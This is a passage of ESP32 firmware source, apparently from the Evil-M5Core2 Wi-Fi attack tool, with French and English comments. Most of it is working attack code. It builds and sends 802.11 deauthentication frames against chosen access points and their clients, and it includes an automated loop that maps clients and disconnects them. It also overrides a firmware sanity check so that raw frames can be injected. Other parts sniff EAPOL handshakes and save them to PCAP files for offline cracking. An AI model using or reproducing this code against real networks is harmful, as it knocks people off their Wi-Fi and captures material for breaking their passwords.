        currentChannelDeauth = currentChannelDeauth > 1 ? currentChannelDeauth - 1 : maxChannelScanning;
        esp_wifi_set_channel(currentChannelDeauth, WIFI_SECOND_CHAN_NONE);
        Serial.print("Static Channel : ");
        Serial.println(currentChannelDeauth);
        lastKeyPressTime = currentPressTime;
      } else if (x > 2 * (tft.width() / 3) && currentPressTime - lastKeyPressTime > debounceDelay) {
        // Zone de droite - Canal suivant
        currentChannelDeauth = currentChannelDeauth < maxChannelScanning ? currentChannelDeauth + 1 : 1;
        esp_wifi_set_channel(currentChannelDeauth, WIFI_SECOND_CHAN_NONE);
        Serial.print("Static Channel : ");
        Serial.println(currentChannelDeauth);
        lastKeyPressTime = currentPressTime;
      } else if (x >= tft.width() / 3 && x <= 2 * (tft.width() / 3)) {
        // Zone du milieu
        if (y < tft.height() / 2 && currentPressTime - lastKeyPressTime > debounceDelay) {
          // Haut de la zone centrale - Mode auto/static
          autoChannelHop = !autoChannelHop;
          Serial.println(autoChannelHop ? "Auto Mode" : "Static Mode");
          lastKeyPressTime = currentPressTime;
        } else if (y >= tft.height() / 2 && currentPressTime - lastKeyPressTime > debounceDelay) {
          // Bas de la zone centrale - Retour
          exitDetected = true;
          lastKeyPressTime = currentPressTime;
          Serial.println("Exiting detection mode...");
        }
      }
    }

    if (autoChannelHop && millis() - lastChannelHopTime > channelHopInterval) {
      currentChannelDeauth = (currentChannelDeauth % maxChannelScanning) + 1;
      esp_wifi_set_channel(currentChannelDeauth, WIFI_SECOND_CHAN_NONE);
      Serial.print("Auto Channel : ");
      Serial.println(currentChannelDeauth);
      lastChannelHopTime = millis();
    }

    // Mise à jour de l'affichage des canaux et du mode
    if (currentChannelDeauth != lastDisplayedChannelDeauth || autoChannelHop != lastDisplayedMode) {
      tft.setCursor(0, 0);
      tft.printf("Channel: %d    \n", currentChannelDeauth);
      lastDisplayedChannelDeauth = currentChannelDeauth;
    }

    if (autoChannelHop != lastDisplayedMode) {
      tft.setCursor(0, 20);
      tft.printf("Mode: %s  \n", autoChannelHop ? "Auto" : "Static");
      lastDisplayedMode = autoChannelHop;
    }

    delay(10);
  }

  esp_wifi_set_promiscuous(false);
  esp_wifi_stop();
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_deinit();
  esp_wifi_init(&cfg);
  esp_wifi_start();
  delay(100); // Pause pour s'assurer que tout est terminé

  waitAndReturnToMenu("Stop detection...");
}



// sniff pcap
bool estUnPaquetEAPOL(const wifi_promiscuous_pkt_t* packet) {
  const uint8_t *payload = packet->payload;
  int len = packet->rx_ctrl.sig_len;

  // length check to ensure packet is large enough for EAPOL (minimum length)
  if (len < (24 + 8 + 4)) { // 24 bytes for the MAC header, 8 for LLC/SNAP, 4 for EAPOL minimum
    return false;
  }

  // check for LLC/SNAP header indicating EAPOL payload
  // LLC: AA-AA-03, SNAP: 00-00-00-88-8E for EAPOL
  if (payload[24] == 0xAA && payload[25] == 0xAA && payload[26] == 0x03 &&
      payload[27] == 0x00 && payload[28] == 0x00 && payload[29] == 0x00 &&
      payload[30] == 0x88 && payload[31] == 0x8E) {
    return true;
  }

  // handle QoS tagging which shifts the start of the LLC/SNAP headers by 2 bytes
  // check if the frame control field's subtype indicates a QoS data subtype (0x08)
  if ((payload[0] & 0x0F) == 0x08) {
    // Adjust for the QoS Control field and recheck for LLC/SNAP header
    if (payload[26] == 0xAA && payload[27] == 0xAA && payload[28] == 0x03 &&
        payload[29] == 0x00 && payload[30] == 0x00 && payload[31] == 0x00 &&
        payload[32] == 0x88 && payload[33] == 0x8E) {
      return true;
    }
  }

  return false;
}


// Définition de l'en-tête de fichier PCAP global
typedef struct pcap_hdr_s {
  uint32_t magic_number;   /* numéro magique */
  uint16_t version_major;  /* numéro de version majeur */
  uint16_t version_minor;  /* numéro de version mineur */
  int32_t  thiszone;       /* correction de l'heure locale */
  uint32_t sigfigs;        /* précision des timestamps */
  uint32_t snaplen;        /* taille max des paquets capturés, en octets */
  uint32_t network;        /* type de données de paquets */
} pcap_hdr_t;

// Définition de l'en-tête d'un paquet PCAP
typedef struct pcaprec_hdr_s {
  uint32_t ts_sec;         /* timestamp secondes */
  uint32_t ts_usec;        /* timestamp microsecondes */
  uint32_t incl_len;       /* nombre d'octets du paquet enregistrés dans le fichier */
  uint32_t orig_len;       /* longueur réelle du paquet */
} pcaprec_hdr_t;


void ecrireEntetePCAP(File & file) {
  pcap_hdr_t pcap_header;
  pcap_header.magic_number = 0xa1b2c3d4;
  pcap_header.version_major = 2;
  pcap_header.version_minor = 4;
  pcap_header.thiszone = 0;
  pcap_header.sigfigs = 0;
  pcap_header.snaplen = 65535;
  pcap_header.network = 105; // LINKTYPE_IEEE802_11

  file.write((const byte*)&pcap_header, sizeof(pcap_hdr_t));
  nombreDeHandshakes++;
}

void enregistrerDansFichierPCAP(const wifi_promiscuous_pkt_t* packet, bool beacon) {
  esp_task_wdt_reset();  // S'assurer que le watchdog est réinitialisé fréquemment
  vTaskDelay(pdMS_TO_TICKS(10));  // Pause pour éviter de surcharger le CPU
  // Construire le nom du fichier en utilisant les adresses MAC de l'AP et du client
  const uint8_t *addr1 = packet->payload + 4;  // Adresse du destinataire (Adresse 1)
  const uint8_t *addr2 = packet->payload + 10; // Adresse de l'expéditeur (Adresse 2)
  const uint8_t *bssid = packet->payload + 16; // Adresse BSSID (Adresse 3)
  const uint8_t *apAddr;

  if (memcmp(addr1, bssid, 6) == 0) {
    apAddr = addr1;
  } else {
    apAddr = addr2;
  }

  char nomFichier[50];
  sprintf(nomFichier, "/handshakes/HS_%02X%02X%02X%02X%02X%02X.pcap",
          apAddr[0], apAddr[1], apAddr[2], apAddr[3], apAddr[4], apAddr[5]);

  // Vérifier si le fichier existe déjà
  bool fichierExiste = SD.exists(nomFichier);

  // Si probe est true et que le fichier n'existe pas, ignorer l'enregistrement
  if (beacon && !fichierExiste) {
    return;
  }

  // Ouvrir le fichier en mode ajout si existant sinon en mode écriture
  File fichierPcap = SD.open(nomFichier, fichierExiste ? FILE_APPEND : FILE_WRITE);
  if (!fichierPcap) {
    Serial.println("Échec de l'ouverture du fichier PCAP");
    return;
  }

  if (!beacon && !fichierExiste) {
    Serial.println("Écriture de l'en-tête global du fichier PCAP");
    ecrireEntetePCAP(fichierPcap);
  }

  if (beacon && fichierExiste) {
    String bssidStr = String((char*)apAddr, 6);
    if (registeredBeacons.find(bssidStr) != registeredBeacons.end()) {
      return; // Beacon déjà enregistré pour ce BSSID
    }
    registeredBeacons.insert(bssidStr); // Ajouter le BSSID à l'ensemble
  }

  // Écrire l'en-tête du paquet et le paquet lui-même dans le fichier
  pcaprec_hdr_t pcap_packet_header;
  pcap_packet_header.ts_sec = packet->rx_ctrl.timestamp / 1000000;
  pcap_packet_header.ts_usec = packet->rx_ctrl.timestamp % 1000000;
  pcap_packet_header.incl_len = packet->rx_ctrl.sig_len;
  pcap_packet_header.orig_len = packet->rx_ctrl.sig_len;
  fichierPcap.write((const byte*)&pcap_packet_header, sizeof(pcaprec_hdr_t));
  fichierPcap.write(packet->payload, packet->rx_ctrl.sig_len);
  fichierPcap.close();
}
//sniff pcap end





// deauther start
// Big thanks to Aro2142 (https://github.com/7h30th3r0n3/Evil-M5Core2/issues/16)
// Even Bigger thanks to spacehuhn https://github.com/spacehuhn / https://spacehuhn.com/
// Big thanks to the Nemo project for the easy bypass: https://github.com/n0xa/m5stick-nemo
// Reference to understand : https://github.com/risinek/esp32-wifi-penetration-tool/tree/master/components/wsl_bypasser

// Warning
// You need to bypass the esp32 firmware with scripts in utilities before compiling or deauth is not working due to restrictions on ESP32 firmware
// Warning

// Global MAC addresses
uint8_t source_mac[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t receiver_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}; // Broadcast
uint8_t ap_mac[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

// Global deauth frame initialized with default values
uint8_t deauth_frame[26] = {
  0xc0, 0x00, 0x3a, 0x01,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff,  // Receiver MAC
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Source MAC
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID
  0xf0, 0xff, 0x02, 0x00
};

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  if (arg == 31337)
    return 1;
  else
    return 0;
}

// Function to update MAC addresses in the global deauth frame
void updateMacAddresses(const uint8_t* bssid) {
  memcpy(source_mac, bssid, 6);
  memcpy(ap_mac, bssid, 6);

  // Update the global deauth frame with the source and BSSID
  memcpy(&deauth_frame[10], source_mac, 6);  // Source MAC
  memcpy(&deauth_frame[16], ap_mac, 6);      // BSSID
}

int deauthCount = 0;

void deauthAttack(int networkIndex) {
  if (!SD.exists("/handshakes")) {
    if (SD.mkdir("/handshakes")) {
      Serial.println("/handshakes folder created");
    } else {
      Serial.println("Fail to create /handshakes folder");
      return;
    }
  }

  String ssid = WiFi.SSID(networkIndex);
  if (!confirmPopup("Deauth attack on:\n      " + ssid)) {
    inMenu = true;
    drawMenu();
    return;
  }

  Serial.println("Deauth attack started");
  esp_wifi_set_promiscuous(false);
  esp_wifi_stop();
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_deinit();
  delay(300);  // Ensure previous operations complete
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_set_mode(WIFI_MODE_STA);  // Set to station mode
  esp_wifi_start();  // Start Wi-Fi

  if (confirmPopup("Do you want to sniff\n          EAPOL ?")) {
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(snifferCallbackDeauth);
  }

  if (networkIndex < 0 || networkIndex >= numSsid) {
    Serial.println("Network index out of bounds");
    return;
  }

  tft.fillScreen(TFT_BLACK);

  uint8_t* bssid = WiFi.BSSID(networkIndex);
  int channel = WiFi.channel(networkIndex);
  String macAddress = bssidToString(bssid);

  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  currentChannelDeauth = channel;
  updateMacAddresses(bssid);

  Serial.print("SSID: "); Serial.println(ssid);
  Serial.print("MAC Address: "); Serial.println(macAddress);
  Serial.print("Channel: "); Serial.println(channel);

  if (!bssid || channel <= 0) {
    Serial.println("Invalid AP - aborting attack");
    tft.println("Invalid AP");
    return;
  }

  int delayTime = 500;  // Délai initial entre les paquets
  unsigned long previousMillis = 0;
  unsigned long lastDebounceTime = 0;

  // Affichage de la zone d'arrêt
  tft.fillRect(0, tft.height() - 30, tft.width(), 30, TFT_RED);
  tft.setCursor(tft.width() / 2 - 24, tft.height() - 20);
  tft.setTextColor(TFT_WHITE, TFT_RED);
  tft.println("Stop");
  tft.setTextColor(TFT_WHITE, TFT_BLACK);

  // Affichage des informations de l'attaque
  tft.setCursor(10, 20);
  tft.println("SSID: " + ssid);
  tft.setCursor(10, 40);
  tft.println("MAC: " + macAddress);
  tft.setCursor(10, 60);
  tft.println("Channel : " + String(channel));
  tft.setCursor(10, 80);
  tft.print("Deauth sent: ");

  Serial.println("-------------------");
  Serial.println("Starting Deauth Attack");
  Serial.println("-------------------");
  screenDebounce();
  while (true) {
    unsigned long currentMillis = millis();

    if (currentMillis - previousMillis >= delayTime) {
      previousMillis = currentMillis;

      sendDeauthPacket();  // Envoie le paquet de deauth
      deauthCount++;

      tft.setCursor(160, 80);
      tft.print(String(deauthCount));
      tft.setCursor(10, 100 );
      tft.print("Delay: " + String(delayTime) + "ms    ");

      Serial.println("Deauth packet sent : " + String(deauthCount));
    }

    // Contrôle tactile pour arrêter l'attaque
    TouchPoint touch = ts.getTouch();
    if (touch.zRaw != 0) {
      int x = map(touch.xRaw, minX, maxX, 0, tft.width());
      int y = map(touch.yRaw, minY, maxY, 0, tft.height());
      if (y > tft.height() - 30 && x >= 0 && x <= tft.width()) {
        break;
      }
    }

    delay(10);
  }

  Serial.println("Stopping Deauth Attack");
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(NULL);
  waitAndReturnToMenu("Stopping Deauth Attack");
}


void sendDeauthPacket() {
  // Send the pre-defined global deauth frame
  esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
  Serial.println();
}

void snifferCallbackDeauth(void* buf, wifi_promiscuous_pkt_type_t type) {
  static unsigned long lastEAPOLDisplayUpdate = 0;  // Temps de la dernière mise à jour de l'affichage EAPOL
  const int eapolDisplayDelay = 1000;  // Délai de mise à jour de l'affichage EAPOL

  if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) return;

  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
  wifi_pkt_rx_ctrl_t ctrl = pkt->rx_ctrl;
  const uint8_t *frame = pkt->payload;
  const uint16_t frameControl = (uint16_t)frame[0] | ((uint16_t)frame[1] << 8);

  const uint8_t frameType = (frameControl & 0x0C) >> 2;
  const uint8_t frameSubType = (frameControl & 0xF0) >> 4;

  unsigned long currentMillis = millis();

  if (estUnPaquetEAPOL(pkt)) {
    const uint8_t *receiverAddr = frame + 4;
    const uint8_t *senderAddr = frame + 10;
    enregistrerDansFichierPCAP(pkt, false);
    nombreDeEAPOL++;

    if (currentMillis - lastEAPOLDisplayUpdate >= eapolDisplayDelay) {
      lastEAPOLDisplayUpdate = currentMillis;

      Serial.println("EAPOL Detected !!!!");
      pixels.setPixelColor(0, pixels.Color(0, 255, 0));
      pixels.show();
      delay(250);
      pixels.setPixelColor(0, pixels.Color(0, 0, 0));
      pixels.show();

      Serial.print("Address MAC destination: ");
      printAddress(receiverAddr);
      Serial.print("Address MAC expedition: ");
      printAddress(senderAddr);

      // Mise à jour de l'affichage pour les EAPOL détectés
      tft.setCursor(tft.width() - 54, 0);
      tft.printf("H:");
      tft.print(nombreDeHandshakes);
      if (nombreDeEAPOL < 99) {
        tft.setCursor(tft.width() - 54, 20);
      } else if (nombreDeEAPOL < 999) {
        tft.setCursor(tft.width() - 72, 20);
      } else {
        tft.setCursor(tft.width() - 90, 20);
      }
      tft.printf("E:");
      tft.print(nombreDeEAPOL);
    }
  }

  if (frameType == 0x00 && frameSubType == 0x08) {
    const uint8_t *senderAddr = frame + 10;  // Adresse source dans la trame de balise

    // Convertir l'adresse MAC en chaîne pour la journalisation
    char macStr[18];
    snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
             senderAddr[0], senderAddr[1], senderAddr[2], senderAddr[3], senderAddr[4], senderAddr[5]);

    // Ajuster la longueur du signal pour l'enregistrement
    pkt->rx_ctrl.sig_len -= 4;
    enregistrerDansFichierPCAP(pkt, true);
  }
}


//deauther end






























// Sniff and deauth clients
bool macFromString(const std::string & macStr, uint8_t* macArray) {
  int values[6];  // Temporary array to store the parsed values
  if (sscanf(macStr.c_str(), "%x:%x:%x:%x:%x:%x",
             &values[0], &values[1], &values[2], &values[3], &values[4], &values[5]) == 6) {
    // Convert to uint8_t
    for (int i = 0; i < 6; ++i) {
      macArray[i] = static_cast<uint8_t>(values[i]);
    }
    return true;
  }
  return false;
}

void broadcastDeauthAttack(const uint8_t* ap_mac, int channel) {
  // Set the channel to the AP's channel
  esp_err_t ret = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  if (ret != ESP_OK) {
    Serial.printf("Erreur lors du changement de canal: %s\n", esp_err_to_name(ret));
    return;
  }

  // Mise à jour de l'affichage pour le canal
  tft.setCursor(100, 1);
  tft.setTextColor(menuTextFocusedColor, TFT_BLACK);
  tft.printf("C:%d  ", channel);

  // Set AP and source MAC addresses
  updateMacAddresses(ap_mac);

  // Set the receiver MAC to broadcast
  memset(receiver_mac, 0xFF, 6);  // Broadcast MAC address

  Serial.println("-----------------------------");
  Serial.print("Deauth for AP MAC: ");
  Serial.println(mac_to_string(ap_mac).c_str());
  Serial.print("On Channel: ");
  Serial.println(channel);

  // Send 10 deauthentication packets
  for (int i = 0; i < nbDeauthSend; i++) {
    sendDeauthPacket();
  }
}

void sendDeauthToClient(const uint8_t* client_mac, const uint8_t* ap_mac, int channel) {
  esp_err_t ret = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  if (ret != ESP_OK) {
    Serial.printf("Erreur lors du changement de canal: %s\n", esp_err_to_name(ret));
    return;
  }

  tft.setCursor(100, 1);
  tft.setTextColor(menuTextFocusedColor, TFT_BLACK);
  tft.printf("C:%d  ", channel);

  uint8_t deauth_frame[sizeof(deauth_frame)];
  memcpy(deauth_frame, deauth_frame, sizeof(deauth_frame));

  // Modifier les adresses MAC dans la trame de déauthentification
  memcpy(deauth_frame + 4, ap_mac, 6);  // Adresse MAC de l'AP (destinataire)
  memcpy(deauth_frame + 10, client_mac, 6);  // Source MAC client
  memcpy(deauth_frame + 16, ap_mac, 6);      // BSSID (AP)

  // Envoyer la trame modifiée
  esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
}

void sendBroadcastDeauths() {
  for (auto& ap : connections) {
    if (!ap.second.empty() && isRegularAP(ap.first)) {
      if (ap_names.find(ap.first) != ap_names.end() && !ap_names[ap.first].empty()) {
        esp_task_wdt_reset();  // S'assurer que le watchdog est réinitialisé fréquemment
        vTaskDelay(pdMS_TO_TICKS(10));  // Pause pour éviter de surcharger le CPU
        Serial.println("-----------------------------");
        Serial.print("Sending Broadcast Deauth to AP: ");
        Serial.println(ap_names[ap.first].c_str());

        tft.setCursor(tft.width() / 2 - 80 , tft.height() / 2 + 28);
        tft.setTextColor(menuTextFocusedColor, TFT_BLACK);
        tft.printf("AP: %s", ap_names[ap.first].c_str());

        int channel = ap_channels_map[ap.first];
        uint8_t ap_mac_address[6];
        if (macFromString(ap.first, ap_mac_address)) {
          broadcastDeauthAttack(ap_mac_address, channel);
          for (const auto& client : ap.second) {
            uint8_t client_mac[6];
            if (macFromString(client, client_mac)) {
              Serial.println("-----------------------------");
              Serial.print("Sending Deauth from client MAC ");
              Serial.print(mac_to_string(client_mac).c_str());
              Serial.print(" to AP MAC ");
              Serial.println(mac_to_string(ap_mac_address).c_str());

              tft.setCursor(tft.width() / 2 - 83 , tft.height() / 2 + 16);
              tft.printf("Sending Deauth to client");

              for (int i = 0; i < nbDeauthSend; i++) {
                sendDeauthToClient(client_mac, ap_mac_address, channel);
              }
            }
          }
          vTaskDelay(deauthWaitingTime);
          tft.setCursor(tft.width() / 2 - 80, tft.height() / 2 + 28);
          tft.printf("                                ");
        } else {
          Serial.println("Failed to convert AP MAC address from string.");
        }
        tft.setCursor(tft.width() / 2 - 83  , tft.height() / 2 + 16);
        tft.printf("                       ");
      }
    }
  }
}

std::string mac_to_string(const uint8_t* mac) {
  char buf[18];
  sprintf(buf, "%02x:%02x:%02x:%02x:%02x:%02x", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  return std::string(buf);
}

void changeChannel() {
  static auto it = ap_channels.begin(); // Initialisation de l'iterator

  if (ap_channels.empty()) {
    Serial.println("Aucun canal valide n'est disponible.");
    return;
  }

  if (it == ap_channels.end()) {
    it = ap_channels.begin();  // Réinitialiser l'iterator si nécessaire
  }

  int newChannel = *it;

  if (newChannel < 1 || newChannel > 13) {
    Serial.println("Canal invalide détecté. Réinitialisation au premier canal valide.");
    it = ap_channels.begin();
    newChannel = *it;
  }

  esp_err_t ret = esp_wifi_set_channel(newChannel, WIFI_SECOND_CHAN_NONE);
  if (ret != ESP_OK) {
    Serial.printf("Erreur lors du changement de canal: %s\n", esp_err_to_name(ret));
    return;
  }

  currentChannel = newChannel;
  it++;

  Serial.print("Switching channel to ");
  Serial.println(currentChannel);
  Serial.println("-----------------------------");

  // Mise à jour de l'affichage du canal
  tft.setCursor(100, 1);
  tft.setTextColor(menuTextFocusedColor, TFT_BLACK);
  tft.printf("C:%d  ", currentChannel);
}

void wifi_scan() {
  Serial.println("-----------------------------");
  Serial.println("Scanning WiFi networks..");
  ap_channels.clear();
  tft.setCursor(0, tft.height() - 20);
  tft.setTextColor(menuTextFocusedColor, TFT_BLACK);
  tft.printf("Scanning nearby networks...");

  int n = WiFi.scanNetworks(false, false);
  if (n == 0) {
    Serial.println("No networks found");
    const char* failedText = "No AP Found.";
    tft.setCursor(0, tft.height() - 20);
    tft.setTextColor(TFT_RED, TFT_BLACK);
    tft.printf(failedText);
    return;
  }

  Serial.print("Found ");
  Serial.print(n);
  Serial.println(" networks");

  for (int i = 0; i < n; ++i) {
    String ssid = WiFi.SSID(i);
    int32_t rssi = WiFi.RSSI(i);
    uint8_t* bssid = WiFi.BSSID(i);
    int32_t channel = WiFi.channel(i);

    std::string bssidString = mac_to_string(bssid);
    ap_names[bssidString] = ssid.c_str();
    ap_channels.insert(channel);
    ap_channels_map[bssidString] = channel;

    Serial.print(bssidString.c_str());
    Serial.print(" | ");
    Serial.print(ssid);
    Serial.print(" | Channel: ");
    Serial.println(channel);
  }

  Serial.println("-----------------------------");
  tft.setCursor(10, 0);
  tft.setTextColor(menuTextFocusedColor, TFT_BLACK);
  tft.printf("AP:%d", n);
  tft.drawLine(0, 19, tft.width(), 19, taskbarDividerColor);
  delay(30);
  tft.fillRect(0, tft.height() - 22, tft.width(), 22, TFT_BLACK);  // Clear scan message
}




bool isRegularAP(const std::string & mac) {
  std::regex multicastRegex("^(01:00:5e|33:33|ff:ff:ff|01:80:c2)");
  return !std::regex_search(mac, multicastRegex);
}
void print_connections() {
  int yPos = 21;  // Initial Y position for text on the screen

  for (auto& ap : connections) {
    if (isRegularAP(ap.first)) {
      if (ap_names.find(ap.first) != ap_names.end() && !ap_names[ap.first].empty()) {
        // Clear the line before printing new data
        tft.fillRect(0, yPos, tft.width(), 20, TFT_BLACK);

        // Print to Serial
        Serial.print(ap_names[ap.first].c_str());
        Serial.print(" (");
        Serial.print(ap.first.c_str());
        Serial.print(") on channel ");
        Serial.print(ap_channels_map[ap.first]);
        Serial.print(" has ");
        Serial.print(ap.second.size());
        Serial.println(" clients:");
        for (auto& client : ap.second) {
          Serial.print(" - ");
          Serial.println(client.c_str());
        }

        // Print to screen
        String currentAPName = String(ap_names[ap.first].c_str());
        int clientCount = ap.second.size();
        String displayText = currentAPName + ": " + String(clientCount);

        tft.setCursor(0, yPos);
        tft.setTextColor(menuTextFocusedColor, TFT_BLACK);
        tft.println(displayText);

        yPos += 20;  // Move the Y position for the next line

        // Ensure there is enough screen space for the next line
        if (yPos > tft.height() - 20) {
          break;  // Exit the loop if there's not enough space for more lines
        }
      }
    }
  }
  Serial.println("-----------------------------");
}



void promiscuous_callback(void* buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  wifi_pkt_rx_ctrl_t ctrl = pkt->rx_ctrl;
  const uint8_t* frame = pkt->payload;
  const uint16_t frameControl = (uint16_t)frame[0] | ((uint16_t)frame[1] << 8);
  const uint8_t frameType = (frameControl & 0x0C) >> 2;
  const uint8_t frameSubType = (frameControl & 0xF0) >> 4;

  const uint8_t* bssid = frame + 16;  // BSSID position for management frames
  std::string bssidStr = mac_to_string(bssid);

  if (estUnPaquetEAPOL(pkt)) {
    Serial.println("-----------------------------");
    Serial.println("EAPOL Detected !!!!!!!!!!!!!!!");

    std::string apName = ap_names[bssidStr];

    // Print AP name or "Unknown" if not found
    Serial.print("EAPOL Detected from AP: ");
    if (!apName.empty()) {
      Serial.println(apName.c_str());
      tft.fillRect(0, tft.height() - 20, tft.width(), 20, TFT_BLACK);
      tft.setCursor(0, tft.height() - 20);
      tft.setTextColor(TFT_RED, TFT_BLACK);
      tft.printf("EAPOL! %s", apName.c_str());
    } else {
      Serial.println("Unknown AP");
      tft.fillRect(0, tft.height() - 20, tft.width(), 20, TFT_BLACK);
      tft.setCursor(0, tft.height() - 20);
      tft.setTextColor(TFT_RED, TFT_BLACK);
      tft.printf("EAPOL from Unknown");
    }

    enregistrerDansFichierPCAP(pkt, false);
    nombreDeEAPOL++;

    // Display updated EAPOL count on the screen
    tft.fillRect(tft.width() - 50, 0, 50, 12, TFT_BLACK);
    tft.setCursor(tft.width() - 50, 0);
    tft.setTextColor(TFT_GREEN, TFT_BLACK);
    tft.printf("E:%d", nombreDeEAPOL);

    esp_task_wdt_reset();  // Reset the watchdog timer
    vTaskDelay(pdMS_TO_TICKS(10));  // Delay for the IDLE task
  }

  if (frameType == 0x00 && frameSubType == 0x08) {  // Beacon frame detection
    const uint8_t* senderAddr = frame + 10;  // Source address in the beacon frame
    char macStr[18];
    snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
             senderAddr[0], senderAddr[1], senderAddr[2], senderAddr[3], senderAddr[4], senderAddr[5]);

    pkt->rx_ctrl.sig_len -= 4;  // Adjust the signal length
    esp_task_wdt_reset();  // Reset the watchdog
    vTaskDelay(pdMS_TO_TICKS(10));
    enregistrerDansFichierPCAP(pkt, true);  // Save the packet
  }

  if (frameType != 2) return;  // Check for data frame

  const uint8_t* mac_ap = frame + 4;
  const uint8_t* mac_client = frame + 10;
  std::string ap_mac = mac_to_string(mac_ap);
  std::string client_mac = mac_to_string(mac_client);

  if (!isRegularAP(ap_mac) || ap_mac == client_mac) return;  // Ignore invalid or self-referential frames

  // Update connections map
  if (connections.find(ap_mac) == connections.end()) {
    connections[ap_mac] = std::vector<std::string>();
  }
  if (std::find(connections[ap_mac].begin(), connections[ap_mac].end(), client_mac) == connections[ap_mac].end()) {
    connections[ap_mac].push_back(client_mac);
  }
}



void purgeAllAPData() {
  connections.clear();  // Clears all client associations
  tft.fillRect(0, 20, tft.width(), tft.height() - 20, TFT_BLACK);  // Clear the screen area for AP data
  Serial.println("All AP and client data have been purged.");
}



void deauthClients() {
  tft.fillScreen(TFT_BLACK);

  // Configuration Wi-Fi initiale
  esp_wifi_set_promiscuous(false);
  WiFi.disconnect(true);
  esp_wifi_stop();
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_restore();
  delay(270);

  nvs_flash_init();
  wifi_init_config_t cfg4 = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg4);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_STA);
  esp_wifi_start();
  delay(30);

  esp_err_t ret = esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
  if (ret != ESP_OK) {
    Serial.printf("Erreur lors du changement de canal: %s\n", esp_err_to_name(ret));
    return;
  }

  purgeAllAPData();
  wifi_scan();

  tft.fillRect(0, 20, tft.width(), tft.height() - 20, TFT_BLACK);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(promiscuous_callback);

  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setCursor(tft.width() - 40, 1);
  tft.printf("D:%d", isDeauthActive ? 1 : 0);
  screenDebounce();

  unsigned long lastScanTime = millis();
  unsigned long lastChannelChange = millis();
  unsigned long lastClientPurge = millis();
  unsigned long lastTimeUpdate = millis();
  unsigned long lastPrintTime = millis();

  bool isRunning = true;

  while (isRunning) {
    esp_task_wdt_reset();
    vTaskDelay(pdMS_TO_TICKS(10));
    handleDnsRequestSerial();  // Tâches d'arrière-plan

    unsigned long currentTimeAuto = millis();

    // Mise à jour des informations toutes les 2 secondes
    if (currentTimeAuto - lastTimeUpdate >= 2000) {
      Serial.println("-----------------");
      Serial.printf("Time to next scan: %lu seconds\n", (scanInterval - (currentTimeAuto - lastScanTime)) / 1000);
      Serial.printf("Time to next purge: %lu seconds\n", (clientPurgeInterval - (currentTimeAuto - lastClientPurge)) / 1000);
      Serial.printf("Time to next channel change: %lu seconds\n", (channelChangeInterval - (currentTimeAuto - lastChannelChange)) / 1000);
      Serial.println("-----------------");
      lastTimeUpdate = currentTimeAuto;
    }

    // Gestion tactile pour les actions utilisateur
    TouchPoint touch = ts.getTouch();
    if (touch.zRaw != 0) {
      int x = map(touch.xRaw, minX, maxX, 0, tft.width());
      int y = map(touch.yRaw, minY, maxY, 0, tft.height());

      if (y < tft.height() / 3) {
        // Zone supérieure - Activation/désactivation de l'attaque
        isDeauthActive = !isDeauthActive;
        Serial.println(isDeauthActive ? "Deauther activated!" : "Deauther disabled!");
        tft.fillRect(tft.width() - 40, 1, 20, 10, TFT_BLACK);
        tft.setCursor(tft.width() - 40, 1);
        tft.printf("D:%d", isDeauthActive ? 1 : 0);
        screenDebounce();
      } else if (y > (tft.height() * 2) / 3) {
        // Zone inférieure - Quitter
        esp_wifi_set_promiscuous(false);
        esp_wifi_set_promiscuous_rx_cb(NULL);
        isRunning = false;
        Serial.println("Stopping deauth clients...");
      }
    }

    // Lancement d'un scan et déconnexion broadcast
    if (currentTimeAuto - lastScanTime >= scanInterval) {
      if (isDeauthActive) {
        sendBroadcastDeauths();
      }
      esp_wifi_set_promiscuous_rx_cb(NULL);
      wifi_scan();
      esp_wifi_set_promiscuous_rx_cb(promiscuous_callback);
      lastScanTime = currentTimeAuto;
      lastChannelChange = currentTimeAuto;  // Réinitialiser le timer pour éviter les conflits
    }

    // Purge des clients toutes les 5 minutes
    if (currentTimeAuto - lastClientPurge >= clientPurgeInterval && currentTimeAuto - lastScanTime >= 1000) {
      purgeAllAPData();
      lastClientPurge = currentTimeAuto;
    }

    // Affichage des connexions toutes les 2 secondes
    if (currentTimeAuto - lastPrintTime >= 2000) {
      print_connections();
      lastPrintTime = currentTimeAuto;
    }

    // Changement de canal toutes les 15 secondes
    if (currentTimeAuto - lastChannelChange >= channelChangeInterval && currentTimeAuto - lastScanTime >= 1000) {
      changeChannel();
      lastChannelChange = currentTimeAuto;
    }
  }

